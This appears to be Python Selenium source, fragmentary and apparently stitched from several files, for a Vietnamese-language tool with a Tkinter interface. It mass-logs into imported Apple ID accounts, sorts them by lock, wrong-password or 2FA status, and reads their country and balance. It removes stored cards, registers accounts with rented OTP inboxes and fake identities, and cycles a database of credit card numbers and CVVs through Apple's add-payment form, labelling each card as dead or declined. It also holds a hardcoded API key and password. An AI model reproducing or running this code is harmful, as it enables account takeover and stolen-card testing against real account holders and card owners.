            browser.find_element(By.XPATH, '/html/body/div[1]/div/div/div/main/div/div/div/div/div[4]/div/div[2]/div/div/div/div[5]/button').click()
            time.sleep(5)
            browser.switch_to.default_content()
            browser.get("https://music.apple.com/us/account/settings")
# Đợi cái frame cài đặt hiển thị lên 
    

        wait.until(EC.visibility_of_element_located((By.CSS_SELECTOR, ".commerce-modal-embedded > iframe:nth-child(1)")))
        iframe_setting = browser.find_element(By.CSS_SELECTOR, ".commerce-modal-embedded > iframe:nth-child(1)")

        iframe_setting = browser.find_element(By.CSS_SELECTOR, ".commerce-modal-embedded > iframe:nth-child(1)")
        browser.switch_to.frame(iframe_setting)
    
        WebDriverWait(browser, 10).until(EC.visibility_of_element_located((By.XPATH, '/html/body/div[1]/div/div/div/main/div/div/div/div/div[1]/div/div[2]/div/div[2]/div[3]/ul/li')))
        country = browser.find_element(By.XPATH, '/html/body/div[1]/div/div/div/main/div/div/div/div/div[1]/div/div[2]/div/div[2]/div[3]/ul/li').text
        WebDriverWait(browser, 10).until(EC.visibility_of_element_located((By.XPATH, '/html/body/div[1]/div/div/div/main/div/div/div/div/div[1]/div/div[2]/div/div[3]/div/ul/li')))
        balance = browser.find_element(By.XPATH, '/html/body/div[1]/div/div/div/main/div/div/div/div/div[1]/div/div[2]/div/div[3]/div/ul/li').text
        
        db_instance.insert_mail_check([data[0][1], data[0][2],country,float(balance.replace("$",""))])
        browser.close()
        

def run_check_delete():
    while(data := db_instance.fetch_data(table_name="mail", columns=["*"], condition="loginDelete = 'Y' and isRunningLoginDelete = 'N' limit 1")): 
        db_instance.update_data(table_name="mail", set_values={"isRunningLoginDelete": "Y"}, condition="id = %s" % data[0][0])
        time.sleep(2)
        if db_instance.check_operator_run() == False:
            break
        browser = webdriver.Firefox(
            seleniumwire_options=option
        )
        wait = WebDriverWait(browser, 20)

        if(data[0] is None): # Trường hợp hết mail
            logging.error("Error Account: %s", str("Hết account khả dụng trong database"))
            browser.close()
            break
    
        browser.get(config.WEB_URL)
    
        account = Account(data[0][1], data[0][2])
        try:
            wait.until(EC.visibility_of_element_located((By.CSS_SELECTOR,  "#ck-container > iframe")))
            iframe = browser.find_element(By.CSS_SELECTOR, value= "#ck-container > iframe")
            browser.switch_to.frame(iframe)
        
        #Nhập account name
            wait.until(EC.visibility_of_element_located((By.ID, "accountName")))
            inputAccount = browser.find_element(By.ID, "accountName")
            inputAccount.send_keys(account.get_account())
        
        # Nhấn nút login
            browser.find_element(By.XPATH, "/html/body/div[1]/div/div/div/div/div[2]/div/div/div[3]/button").click()
            wait.until(EC.visibility_of_element_located((By.CSS_SELECTOR, "#aid-auth-widget-iFrame")))
            iframe_auth = browser.find_element(By.CSS_SELECTOR, "#aid-auth-widget-iFrame")
            browser.switch_to.frame(iframe_auth)
        except Exception as e:
            logging.error("Error Tool: %s", str("Không bắt kịp request! Vui lòng kiểm tra mạng hoặc proxy"))
        # continue
            sys.exit()
    
    #Nhập password
        try:   # Chọn tới vị trí con trỏ hiện tại
            wait.until(EC.visibility_of_element_located((By.XPATH, '//*[@id="password_text_field"]')))
            inputPassword = browser.find_element(By.XPATH, '//*[@id="password_text_field"]')
            inputPassword.send_keys(account.get_password())
            wait.until(EC.visibility_of_element_located((By.XPATH, '//*[@id="sign-in"]')))
            browser.find_element(By.XPATH, '//*[@id="sign-in"]').click()
        #active_element = browser.switch_to.active_element
        #time.sleep(2)
        #active_element.send_keys(account.get_password())
        # Nhấn enter
        #active_element.send_keys(Keys.ENTER)
        #time.sleep(3)
        # Kiểm tra trường hợp bị lock
            if check_account_is_block(browser):
                logging.error("Error Account: Id -  %s", str(data[0][1] +" "+tool_exception.LOCK))
                db_instance.insert_mail_delete([data[0][1], data[0][2], "UnLock", "","none"])
                browser.close()
                continue
        
            if check_account_login_invalid_password(browser):
                logging.error("Error Account: Id - %s", str(data[0][1] +"-" +tool_exception.INVALID_PASSWORD))
                db_instance.insert_mail_delete([data[0][1], data[0][2], "sai pass", "","none"])
                browser.close()
                continue
        
            time.sleep(5)
        # Kiểm tra acc có otp 
            if check_account_has_otp(browser):
                logging.error("Error Account: Id - %s", str(data[0][1] +"-"+"2FA"))
                db_instance.insert_mail_delete([data[0][1], data[0][2], "2FA", "","none"])
                browser.close()
                continue
        # Lần đầu đăng nhập
            try:
                click_on_setting = False
                active_element = browser.switch_to.active_element
                active_element.send_keys(Keys.TAB)
                active_element.send_keys(Keys.TAB)
                active_element.send_keys(Keys.TAB)
                active_element.send_keys(Keys.ENTER)
                time.sleep(5)
                click_on_setting = True
            # time.sleep(10)
            # browser.switch_to.default_content()
            # WebDriverWait(browser, 10).until(EC.visibility_of_element_located((By.XPATH, '//*[@id="ck-container"]')))
            # iframe_hello = browser.find_element(By.XPATH,'//*[@id="ck-container"]').find_element(By.TAG_NAME, 'iframe')
            # # src_value = iframe_hello.get_attribute("src")
            # browser.switch_to.frame(iframe_hello)
            # browser.find_element(By.TAG_NAME, 'button')
           
            # browser.find_element(By.TAG_NAME, 'button').click()
            # time.sleep(5)
    

            except Exception as e:
                click_on_setting = False
                print(e)
            
        
            browser.switch_to.default_content()
        # time.sleep(5)
        
        
        except Exception as e:
            logging.error("Error: %s", str("Không bắt kịp request! Vui lòng kiểm tra mạng hoặc proxy"))
            browser.close()
            continue
        browser.switch_to.default_content()
    # Đoạn này là đăng nhập đã thành công
    # Chuyển hướng sang trang cài đặt
        browser.get("https://music.apple.com/us/account/settings")
        if click_on_setting:
    # time.sleep(5)
        # time.sleep(5)
            WebDriverWait(browser, 10).until(EC.visibility_of_element_located((By.CSS_SELECTOR, '.commerce-modal-embedded > iframe:nth-child(1)')))
            iframe_hello = browser.find_element(By.CSS_SELECTOR, '.commerce-modal-embedded > iframe:nth-child(1)')
            browser.switch_to.frame(iframe_hello)
            WebDriverWait(browser, 10).until(EC.visibility_of_element_located((By.XPATH, '/html/body/div[1]/div/div/div/main/div/div/div/div/div[4]/div/div[2]/div/div/div/div[5]/button')))
            browser.find_element(By.XPATH, '/html/body/div[1]/div/div/div/main/div/div/div/div/div[4]/div/div[2]/div/div/div/div[5]/button').click()
            time.sleep(5)
            browser.switch_to.default_content()
            browser.get("https://music.apple.com/us/account/settings")
# Đợi cái frame cài đặt hiển thị lên 
    

        wait.until(EC.visibility_of_element_located((By.CSS_SELECTOR, ".commerce-modal-embedded > iframe:nth-child(1)")))
        iframe_setting = browser.find_element(By.CSS_SELECTOR, ".commerce-modal-embedded > iframe:nth-child(1)")

        iframe_setting = browser.find_element(By.CSS_SELECTOR, ".commerce-modal-embedded > iframe:nth-child(1)")
        browser.switch_to.frame(iframe_setting)
    
        WebDriverWait(browser, 10).until(EC.visibility_of_element_located((By.XPATH, '/html/body/div[1]/div/div/div/main/div/div/div/div/div[1]/div/div[2]/div/div[2]/div[3]/ul/li')))
        country = browser.find_element(By.XPATH, '/html/body/div[1]/div/div/div/main/div/div/div/div/div[1]/div/div[2]/div/div[2]/div[3]/ul/li').text
        
    # click nút change payment 
        wait.until(EC.visibility_of_element_located((By.XPATH, '/html/body/div[1]/div/div/div/main/div/div/div/div/div[1]/div/div[2]/div/div[2]/div[1]/ul/li[2]/button')))
        browser.find_element(By.XPATH, '/html/body/div[1]/div/div/div/main/div/div/div/div/div[1]/div/div[2]/div/div[2]/div[1]/ul/li[2]/button').click()
        browser.switch_to.default_content()
    
        wait.until(EC.visibility_of_element_located((By.CSS_SELECTOR, ".commerce-modal-embedded > iframe:nth-child(1)")))
        iframe_payment = browser.find_element(By.CSS_SELECTOR, ".commerce-modal-embedded > iframe:nth-child(1)")
        browser.switch_to.frame(iframe_payment)
    # Kiểm tra đã add thẻ 
    
        wait_child = WebDriverWait(browser, 10)
        try: 
            wait_child.until(EC.visibility_of_element_located((By.CLASS_NAME, 'payment-method-module-card')))
            browser.find_element(By.CLASS_NAME, 'payment-method-module-card').click()
        
        #Nhấn vào thẻ 
            wait.until(EC.visibility_of_element_located((By.XPATH,'/html/body/div[1]/div/div/div/main/div/div/div/div/div[2]/camk-section/camk-section-grid/camk-section-item[1]/div/button')))
            browser.find_element(By.XPATH,'/html/body/div[1]/div/div/div/main/div/div/div/div/div[2]/camk-section/camk-section-grid/camk-section-item[1]/div/button').click()
        
        # Chuyển sang iframe thanh toán 
            browser.switch_to.default_content()
            wait.until(EC.visibility_of_element_located((By.CSS_SELECTOR, "#ck-container > iframe:nth-child(1)")))
            iframe_child_payment = browser.find_element(By.CSS_SELECTOR, "#ck-container > iframe:nth-child(1)")
            browser.switch_to.frame(iframe_child_payment)
            print(iframe_child_payment)
        #Remove thẻ 
            wait.until(EC.visibility_of_element_located((By.XPATH,'/html/body/div[1]/div/div/div/div/div[2]/div/div[4]/csk-button/button')))
            browser.find_element(By.XPATH,'/html/body/div[1]/div/div/div/div/div[2]/div/div[4]/csk-button/button').click()
        
        # Nhấn nút remove
            wait.until(EC.visibility_of_element_located((By.XPATH,'/html/body/div[1]/div/div/camk-modal/div/camk-modal-button-bar/camk-button-bar/div/div[2]/button')))
            browser.find_element(By.XPATH,'/html/body/div[1]/div/div/camk-modal/div/camk-modal-button-bar/camk-button-bar/div/div[2]/button').click()
            db_instance.insert_mail_delete([data[0][1], data[0][2],"",country,"bin"])
            browser.close()
        except Exception as e: # Không có thẻ 
            print(e)
            db_instance.insert_mail_delete([data[0][1], data[0][2],"",country,"none"])
            browser.close()
            


import sys
from tkinter import *
from tkinter import filedialog
from tkinter import messagebox

sys.path.append('./utils')
sys.path.append('./')
from utils import import_id 
from utils import import_card
import threading
from PIL import Image, ImageTk
import os
import subprocess
import concurrent.futures
# from utils import reg_apple_music as REG
all_thread = []

def add_id():
    try:
        file_path = filedialog.askopenfilename(filetypes=[("Text files", "*.txt")])
        if file_path:
            with open(file_path, 'r') as file:
                content = file.read()
                import_id.process_data(content)
                messagebox.showinfo("Thành công", "Thêm id thành công")
        
         
        
    except Exception as e:
        print(e)
        messagebox.showerror("Thất bại", "Error: Thêm thất bại vui lòng kiểm tra định dạng file hoặc network" )
def add_card():
    try:
        file_path = filedialog.askopenfilename(filetypes=[("Text files", "*.txt")])
        if file_path:
            with open(file_path, 'r') as file:
                content = file.read()
                import_card.process_data(content)
                messagebox.showinfo("Thành công", "Thêm thẻ thành công")
        
    except Exception as e:
        print(e)
        messagebox.showerror("Thất bại", "Error: Thêm thất bại vui lòng kiểm tra định dạng file hoặc network" )
        
def clear_frame(frame):
    for widget in frame.winfo_children():
        widget.destroy()
def run_app():
    def run_tool():
        browser = webdriver.Firefox(seleniumwire_options=option)
        run(browser)  # Call the main tool function
        # root.deiconify()  # After the tool finishes execution, show the main window again

    def on_spin_change():
        value = spinbox.get()
        try:
            value = int(value)
            with concurrent.futures.ThreadPoolExecutor(max_workers=value) as executor:
                for _ in range(value):
                    executor.submit(run_tool)
        except ValueError:
            messagebox.showerror("Error", "Nhập số tab không hợp lệ")
    # Hide the main window while running the tool
    # root.withdraw()
    image_label.place_forget()
    analysis_frame.place_forget()
    clear_frame(frame_app)
    frame_app.place(relx=0.5, rely=0.5, anchor="center")
    
    label_title = Label(frame_app, text="Số tab cần chạy", font=("Arial", 20), bg="white")
    label_title.pack(pady=10)
    # Tạo một Spinbox với các giá trị từ 1 đến 10
    spinbox = Spinbox(frame_app, from_=1, to=20)
    spinbox.pack(pady=10)

    # Button để lấy giá trị hiện tại của Spinbox
    btn_get_value = Button(frame_app, text="Get Value", command=on_spin_change)
    btn_get_value.pack(pady=5)
    
    # tool_thread = threading.Thread(target=run_tool)
    # tool_thread.start()
    # all_thread.append(tool_thread)
def run_app_check():
    def run_tool():
        run_check()  # Call the main tool function

        # After the tool finishes execution, show the main window again
        root.deiconify()
    def on_spin_change():
        value = spinbox.get()
        
        try:
            value = int(value)
            for i in range(1, value + 1):
                time.sleep(1)
                threading.Thread(target=run_tool).start()
                # Kiểm tra xem luồng đã được khởi động chưa trước khi tạo luồng mới
                # if len(all_thread) < value or not all_thread[i-1].is_alive():
                #     all_thread.append(threading.Thread(target=run_tool))
                #     all_thread[i-1].start()
                # else:
                #     messagebox.showwarning("Error", "Cần mở lại ứng dụng để chạy chức năng này")
        except ValueError:
            messagebox.showerror("Error", "Nhập số tab không hợp lệ")
    # root.withdraw()
    image_label.place_forget()
    analysis_frame.place_forget()
    clear_frame(frame_app)
    frame_app.place(relx=0.5, rely=0.5, anchor="center")
    
    label_title = Label(frame_app, text="Số tab cần chạy", font=("Arial", 20), bg="white")
    label_title.pack(pady=10)
    # Tạo một Spinbox với các giá trị từ 1 đến 10
    spinbox = Spinbox(frame_app, from_=1, to=20)
    spinbox.pack(pady=10)

    # Button để lấy giá trị hiện tại của Spinbox
    btn_get_value = Button(frame_app, text="Get Value", command=on_spin_change)
    btn_get_value.pack(pady=5)
    
def run_app_delete():
    def run_tool():
        run_check_delete()  # Call the main tool function
        
    root.deiconify()
    def on_spin_change():
        value = spinbox.get()
        try:
            value = int(value)
            for i in range(1, value + 1):
                time.sleep(1)
                threading.Thread(target=run_tool).start()
                # Kiểm tra xem luồng đã được khởi động chưa trước khi tạo luồng mới
                # if len(all_thread) < value or not all_thread[i-1].is_alive():
                #     all_thread.append(threading.Thread(target=run_tool))
                #     all_thread[i-1].start()
                # else:
                #     messagebox.showwarning("Error", "Cần mở lại ứng dụng để chạy chức năng này")
        except Exception as e:
            print(e)
            messagebox.showerror("Error", "Nhập số tab không hợp lệ")
    # Hide the main window while running the tool
    # root.withdraw()
    image_label.place_forget()
    analysis_frame.place_forget()
    clear_frame(frame_app)
    frame_app.place(relx=0.5, rely=0.5, anchor="center")
    
    label_title = Label(frame_app, text="Số tab cần chạy", font=("Arial", 20), bg="white")
    label_title.pack(pady=10)
    # Tạo một Spinbox với các giá trị từ 1 đến 10
    spinbox = Spinbox(frame_app, from_=1, to=20)
    spinbox.pack(pady=10)

    # Button để lấy giá trị hiện tại của Spinbox
    btn_get_value = Button(frame_app, text="Get Value", command=on_spin_change)
    btn_get_value.pack(pady=5)
    
        
def export_success_id():
    try:
        file_path = filedialog.asksaveasfilename(defaultextension=".txt", filetypes=[("Text files", "*.txt"), ("All files", "*.*")])
        if file_path:
            with open(file_path, 'w') as file:
                for data in db_instance.analysis_id_scusess():
                    file.write(data[0] + '|' + data[1] + '|' + data[2] + '|' + data[3] + '|' + data[4] + '|' + data[5]  + '\n')
                messagebox.showinfo("Thông báo", "Xuất thành công")
                subprocess.Popen(['notepad.exe', file_path])
    except Exception as e:
        print(e)
        messagebox.showerror("Thông báo", "Error: Xuất thất bại kiểm tra lại tên, đường dẫn hoăc không đủ quyền")
def close_app():
    for thread in all_thread:
        thread.join()
    root.destroy()

def open_analysis():
    def selected_option(value):
        
        return value
    
    def export_error_data():
        try:
            file_path = filedialog.asksaveasfilename(defaultextension=".txt", filetypes=[("Text files", "*.txt"), ("All files", "*.*")])
            err = selected_value.get()
            if file_path:
                with open(file_path, 'w') as file:
                    for data in db_instance.export_error_id(err):
                        if len(data) >= 3:
                            file.write(data[0] + '|' + data[1] + '|' + data[2] + '\n')
                        else:
                            file.write(data[0] + '|' + data[1] + '|' + err + '\n')
                    messagebox.showinfo("Thông báo", "Xuất thành công") 
                    subprocess.Popen(['notepad.exe', file_path])
            
        except Exception as e:
            print(e)
            messagebox.showerror("Thất bị", "Vui lòng kiểm tra lại đường dẫn hoặc không đủ quyền" )
            
    frame_app.place_forget()
    clear_frame(analysis_frame)
    # Ẩn hình ảnh
    image_label.place_forget()
    
    # Tạo một Frame với chiều rộng bằng với root
    analysis_frame.place(relx=0.5, rely=0.5, anchor="center")
    label = Label(analysis_frame, text="Chọn lỗi muốn xuất:", font=("Arial", 20), bg="white")
    label.pack(pady=5)
    options = ["Diss", "UnLock", "add sup", "2FA", "SaiPass","country"]

    # Biến để lưu trữ giá trị được chọn
    selected_value = StringVar(analysis_frame)
    selected_value.set(options[0])  # Đặt giá trị mặc định

    # Tạo OptionMenu
    option_menu = OptionMenu(analysis_frame, selected_value, *options, command=selected_option)
    option_menu.pack(pady=7)
    
    submit_btn = Button(analysis_frame, text="Xuất", command=export_error_data)
    submit_btn.pack(pady=10)
    

def close_app():
    root.quit()

def export_success_pay():
    try:
        file_path = filedialog.asksaveasfilename(defaultextension=".txt", filetypes=[("Text files", "*.txt"), ("All files", "*.*")])
        if file_path:
            with open(file_path, 'w') as file:
                for data in db_instance.analysis_pay_scusess():
                    file.write(data[0] + '|' + data[1] + '|' + data[2] + '|' + data[3] + '|' + str(data[4]) + '\n')
                messagebox.showinfo("Thể báo", "Xuất thẻ thành công")
                subprocess.Popen(['notepad.exe', file_path])
    except Exception as e:
        print(e)
        messagebox.showerror("Thể báo", "Error: Xuất thể thất bại")
# def export_error_pay():
#     try:
#         file_path = filedialog.asksaveasfilename(defaultextension=".txt", filetypes=[("Text files", "*.txt"), ("All files", "*.*")])
#         if file_path:
#             with open(file_path, 'w') as file:
#                 for data in db_instance.analysis_pay_error():
#                     file.write(data[0] + '|' + data[1] + '|' + data[2] + '|' + data[3] + '|' + data[4] + '\n')
#                 messagebox.showinfo("Thông báo", "Xuất thành công")
#                 subprocess.Popen(['notepad.exe', file_path])
#     except Exception as e:
#         print(e)
#         messagebox.showerror("Thông báo", "Error: Xuất thất bại")
def export_login_check_id():
    try:
        file_path = filedialog.asksaveasfilename(defaultextension=".txt", filetypes=[("Text files", "*.txt"), ("All files", "*.*")])
        if file_path:
            with open(file_path, 'w') as file:
                for data in db_instance.analysis_id_check():
                    file.write(data[0] + '|' + data[1] + '|' + data[2] + '|' + str(data[3]) + '\n')
                messagebox.showinfo("Thông báo", "Xuất thành công")
                subprocess.Popen(['notepad.exe', file_path])
    except Exception as e:
        print(e)
        messagebox.showerror("Thông báo", "Error: Xuất thất bại kiểm tra lại tên, đường dẫn hoăc không đủ quyền")


def export_login_delete_id():
    try:
        file_path = filedialog.asksaveasfilename(defaultextension=".txt", filetypes=[("Text files", "*.txt"), ("All files", "*.*")])
        if file_path:
            with open(file_path, 'w') as file:
                for data in db_instance.analysis_id_delete():
                    file.write(data[0] + '|' + data[1] + '|' + data[2] + '|' + data[3] + '|' + data[4] + '\n')
                messagebox.showinfo("Thông báo", "Xuất thành công")
                subprocess.Popen(['notepad.exe', file_path])
    except Exception as e:
        print(e)
        messagebox.showerror("Thông báo", "Error: Xuất thất bại kiểm tra lại tên, đường dẫn hoăc không đủ quyền")


def open_tool():
    db_instance.start_tool()
    messagebox.showinfo("Thông báo", "Mở tool thành công hãy thực hiện chức năng")

def close_tool():
    db_instance.close_tool()
    messagebox.showinfo("Thông báo", "Tool đóng thành công vui lòng đợi các id khác thực hiện xong")
def open_error_pay():
    def selected_option(value):
        return value
    
    def export_error_data_pay():
        try:
            file_path = filedialog.asksaveasfilename(defaultextension=".txt", filetypes=[("Text files", "*.txt"), ("All files", "*.*")])
            err = selected_value.get()
            if file_path:
                with open(file_path, 'w') as file:
                    for data in db_instance.export_error_pay(err):
                        file.write(data[0] + '|' + data[1] + '|' + data[2] + '|' + str(data[3]) + '|' + data[4] + '\n')
                    messagebox.showinfo("Thông báo", "Xuất thành công") 
                    subprocess.Popen(['notepad.exe', file_path])
            
        except Exception as e:
            print(e)
            messagebox.showerror("Thất bị", "Vui lòng kiểm tra lại đường dẫn hoặc không đủ quyền" )
        
    frame_app.place_forget()
    clear_frame(analysis_frame)
    # Ẩn hình ảnh
    image_label.place_forget()
    
    # Tạo một Frame với chiều rộng bằng với root
    analysis_frame.place(relx=0.5, rely=0.5, anchor="center")
    label = Label(analysis_frame, text="Chọn lỗi muốn xuất:", font=("Arial", 20), bg="white")
    label.pack(pady=5)
    options = ["Die", "To Many ID", "add sup", "contact suport", "DEC"]

    # Biến để lưu trữ giá trị được chọn
    selected_value = StringVar(analysis_frame)
    selected_value.set(options[0])  # Đặt giá trị mặc định

    # Tạo OptionMenu
    option_menu = OptionMenu(analysis_frame, selected_value, *options, command=selected_option)
    option_menu.pack(pady=7)
    
    submit_btn = Button(analysis_frame, text="Xuất", command=export_error_data_pay)
    submit_btn.pack(pady=10)
#===================================GUI END FUCITON======================================
import random
import string
import datetime
import time
import requests
import json
import random
from seleniumwire import webdriver
from selenium.webdriver.common.keys import Keys
from selenium.webdriver.common.by import By
from selenium.webdriver.support.ui import WebDriverWait
from selenium.webdriver.support import expected_conditions as EC
from selenium.common.exceptions import NoSuchElementException
from selenium.webdriver.support.select import Select

def generate_random_password(length):
    characters = string.ascii_letters + string.digits
    password = ''.join(random.choice(characters) for _ in range(length))
    return password

def generate_name(length):
    random_string = ''.join(random.choice(string.ascii_lowercase) for _ in range(length))
    letter = random_string.capitalize()
    
    return letter

def generate_random_date_of_birth():
    day = str(random.randint(1, 28)).zfill(2)  
    month = str(random.randint(1, 12)).zfill(2)
    year = str(random.randint(1904, datetime.datetime.now().year - 18))  
    
    date_of_birth = month + day + year
    print(date_of_birth)
    return date_of_birth

def random_data():
    password = generate_random_password(8)
    frist_name = generate_name(5)
    last_name = generate_name(5)
    date_of_birth = generate_random_date_of_birth()
    return frist_name, last_name, date_of_birth,password

def generate_random_email():
        mail_wait = db_instance.get_mail_wait()
        print(mail_wait)
        if mail_wait is not None:
            return mail_wait[0][1], 'wait'
        else:
            while True:
                thue_mail_url = 'https://api.sptmail.com/api/otp-services/gmail-otp-rental?apiKey=CMFI1WCKSY339AIA&otpServiceCode=apple'
                response = requests.get(thue_mail_url)
                print(response.status_code)
                # if response.json()['message'] == 200:
                if response.status_code == 200:
                    response_data = response.json()
                    return response_data['gmail'], 'rent'
                time.sleep(20) 
                
    
def random_address():
    json_file = './assets/data/addresses.json'  
    with open(json_file, 'r') as f:
        data = json.load(f)

    # Lấy danh sách các địa chỉ từ khóa 'addresses'
    addresses = data.get('addresses', [])

    # Chọn ngẫu nhiên một địa chỉ từ danh sách
    random_address = random.choice(addresses)
    return random_address['address1'], random_address['address2'], random_address['city'], random_address['state'], random_address['postalCode']

def getOTP(gmail):
    while True:
        thue_mail_url = f'https://api.sptmail.com/api/otp-services/gmail-otp-lookup?apiKey=CMFI1WCKSY339AIA&otpServiceCode=apple&gmail={gmail}'
        response = requests.get(thue_mail_url)
        resp = response.json()
        if resp['status'] == 'PENDING':
            time.sleep(5)
        if resp['status'] == 'SUCCESS':
            return resp['otp']
def click_first_login(browser):
    
    browser.get("https://music.apple.com/us/account/settings")
    time.sleep(5)
    WebDriverWait(browser, 10).until(EC.visibility_of_element_located((By.CSS_SELECTOR, '.commerce-modal-embedded > iframe:nth-child(1)')))
    iframe_hello = browser.find_element(By.CSS_SELECTOR, '.commerce-modal-embedded > iframe:nth-child(1)')
    browser.switch_to.frame(iframe_hello)
    WebDriverWait(browser, 10).until(EC.visibility_of_element_located((By.XPATH, '/html/body/div[1]/div/div/div/main/div/div/div[5]/button')))
    browser.find_element(By.XPATH, '/html/body/div[1]/div/div/div/main/div/div/div[5]/button').click()
    time.sleep(5)
    browser.switch_to.default_content()
    browser.get("https://music.apple.com/us/account/settings")
    
def apple_id_done(browser, data):
    # browser = webdriver.Firefox(seleniumwire_options=option)
    browser.get("https://appleid.apple.com/sign-in")
    
    WebDriverWait(browser, 10).until(EC.visibility_of_element_located((By.CSS_SELECTOR, "#aid-auth-widget-iFrame")))
    iframe_login = browser.find_element(By.CSS_SELECTOR, "#aid-auth-widget-iFrame")
    browser.switch_to.frame(iframe_login)
    
    wait = WebDriverWait(browser, 10)
    wait.until(EC.visibility_of_element_located((By.ID, "account_name_text_field")))
    browser.find_element(By.ID, "account_name_text_field").send_keys(data['account'])
    
    browser.switch_to.active_element.send_keys(Keys.ENTER)
    browser.switch_to.default_content()
    browser.switch_to.frame(iframe_login)
    wait.until(EC.visibility_of_element_located((By.ID, "password_text_field")))
    browser.find_element(By.ID, "password_text_field").send_keys("Zxcv123123")
    browser.switch_to.active_element.send_keys(Keys.ENTER)
    time.sleep(5)
    browser.switch_to.default_content()
    active_element = browser.switch_to.active_element
    otp = getOTP(data["account"])
    time.sleep(10)
    otp = getOTP(data["account"])
    # time.sleep(5)
    active_element.send_keys(otp)
    time.sleep(3)
    active_element.send_keys(Keys.TAB)
    active_element.send_keys(data['ccv'])
    active_element.send_keys(Keys.ENTER)
    # Nếu không được thì nhấn 1 lần nữa 
    time.sleep(3)
    
    try: 
       active_element.send_keys(data['ccv'])
       active_element.send_keys(Keys.ENTER)
    except Exception as e:
        print(e) # Không còn nút đó 
    
    db_instance.insert_mail_reg_apple_music([data['account'], "Zxcv123123", data['card_number'], data['month_exp'], data['year_exp'], data['ccv']])
    # Lưuvào db 
    #OTP xong
    browser.quit()

def process_login(browser, data):
    browser.switch_to.default_content()
    try:
        active_element = browser.switch_to.active_element
        active_element.send_keys(data['password'])
        active_element.send_keys(Keys.ENTER)
        time.sleep(5)
        browser.switch_to.default_content()
        browser.get("https://music.apple.com/us/account/settings")
        add_payment(browser, data)
    except Exception as e:
        print(e)
    
def add_payment(browser, data):
    wait = WebDriverWait(browser, 10)
    wait.until(EC.visibility_of_element_located((By.CSS_SELECTOR, ".commerce-modal-embedded > iframe:nth-child(1)")))
    iframe_setting = browser.find_element(By.CSS_SELECTOR, ".commerce-modal-embedded > iframe:nth-child(1)")
    browser.switch_to.frame(iframe_setting)

    WebDriverWait(browser, 10).until(EC.visibility_of_element_located((By.XPATH, '/html/body/div[1]/div/div/div/main/div/div/div/div/div[1]/div/div[2]/div/div[2]/div[3]/ul/li')))
    country = browser.find_element(By.XPATH, '/html/body/div[1]/div/div/div/main/div/div/div/div/div[1]/div/div[2]/div/div[2]/div[3]/ul/li').text
    print(country)
    if country != "United States":
        print("Not US") 
    # click nút change payment 
    wait.until(EC.visibility_of_element_located((By.XPATH, '/html/body/div[1]/div/div/div/main/div/div/div/div/div[1]/div/div[2]/div/div[2]/div[1]/ul/li[2]/button')))
    browser.find_element(By.XPATH, '/html/body/div[1]/div/div/div/main/div/div/div/div/div[1]/div/div[2]/div/div[2]/div[1]/ul/li[2]/button').click()
    time.sleep(5)
    browser.switch_to.default_content()
    wait.until(EC.visibility_of_element_located((By.XPATH, "/html/body/div/div[4]/main/div/div/iframe")))
    iframe_payment = browser.find_element(By.XPATH, "/html/body/div/div[4]/main/div/div/iframe")
    browser.switch_to.frame(iframe_payment)
    # Nhấn nút add payment
    wait.until(EC.visibility_of_element_located((By.XPATH,'/html/body/div[1]/div/div/div/main/div/div/div/div/div[2]/camk-section/camk-section-grid/camk-banner-card/div[2]/div/div[2]/div[2]/button')))
    browser.find_element(By.XPATH,'/html/body/div[1]/div/div/div/main/div/div/div/div/div[2]/camk-section/camk-section-grid/camk-banner-card/div[2]/div/div[2]/div[2]/button').click()
    browser.switch_to.default_content()
    iframe_add_payment = browser.find_element(By.CSS_SELECTOR, "#ck-container > iframe:nth-child(1)")
    browser.switch_to.frame(iframe_add_payment)
    
    wait.until(EC.visibility_of_element_located((By.ID, "addressOfficialLineFirst")))
    address_1 = browser.find_element(By.ID, "addressOfficialLineFirst")
    for i in data["address1"]:
        address_1.send_keys(i)
        time.sleep(0.06)
    wait.until(EC.visibility_of_element_located((By.ID, "addressOfficialLineSecond")))
    address_2 = browser.find_element(By.ID, "addressOfficialLineSecond")
    for i in data["address2"]:
        address_2.send_keys(i)
        time.sleep(0.06)
    
    wait.until(EC.visibility_of_element_located((By.ID, "addressOfficialCity")))
    city_element = browser.find_element(By.ID, "addressOfficialCity")
    for i in data["city"]:
        city_element.send_keys(i)
        time.sleep(0.06)
    wait.until(EC.visibility_of_element_located((By.ID, "addressOfficialStateProvince")))
    select = Select(browser.find_element(By.ID, "addressOfficialStateProvince"))
    select.select_by_value(data["state"])
    wait.until(EC.visibility_of_element_located((By.ID, "addressOfficialPostalCode")))
    post_code = browser.find_element(By.ID, "addressOfficialPostalCode")
    for i in data["postalCode"]:
        post_code.send_keys(i)
        time.sleep(0.06)
    
    
    run_add_card = True
    while run_add_card:
        data_card = db_instance.fetch_data(table_name="pay", columns=["*"], condition="status = 1 limit 1")
        try:
            if data_card[0] is None:
                logging.error("Error: %s", str("Hết thẻ"))
                sys.exit() # Dừng chương trình
        except IndexError:
            logging.error("Error: %s", str("Hết thẻ"))
            browser.close()
            sys.exit()
         
        
        card = Card(data_card[0][1], data_card[0][2]+""+ data_card[0][3], data_card[0][4])
        wait.until(EC.visibility_of_element_located((By.XPATH,'//*[@id="creditCardNumber"]')))
        card_number_element = browser.find_element(By.XPATH,'//*[@id="creditCardNumber"]')
        card_number_element.clear()
        for i in card.get_card_number():
            card_number_element.send_keys(i)
            time.sleep(0.1)
    # browser.find_element(By.XPATH,'//*[@id="creditCardNumber"]').send_keys("")

        wait.until(EC.visibility_of_element_located((By.XPATH,'//*[@id="creditCardExpirationMonth-creditCardExpirationYear"]')))
        card_expiration_element = browser.find_element(By.XPATH,'//*[@id="creditCardExpirationMonth-creditCardExpirationYear"]')
        card_expiration_element.clear()
        for i in card.get_card_expiration():
            card_expiration_element.send_keys(i)
            time.sleep(0.1)
    # browser.find_element(By.XPATH,'//*[@id="creditCardExpirationMonth-creditCardExpirationYear"]').send_keys("")

        wait.until(EC.visibility_of_element_located((By.XPATH,'//*[@id="creditVerificationNumber"]')))
        card_ccv_element = browser.find_element(By.XPATH,'//*[@id="creditVerificationNumber"]')
        card_ccv_element.clear()
        for i in card.get_card_ccv():
            card_ccv_element.send_keys(i)
            time.sleep(0.1)
    # browser.find_element(By.XPATH,'//*[@id="creditVerificationNumber"]').send_keys("658")
        browser.find_element(By.XPATH,'/html/body/div[1]/div/div/div/div/div[3]/div/button').click()

    # Kiểm tra các trường hợp lỗi của thẻ 
        try:
            wait.until(EC.visibility_of_element_located((By.XPATH, "/html/body/div[1]/div/div/camk-modal")))
            add_payment_result = browser.find_element(By.CSS_SELECTOR, ".camk-modal-description")
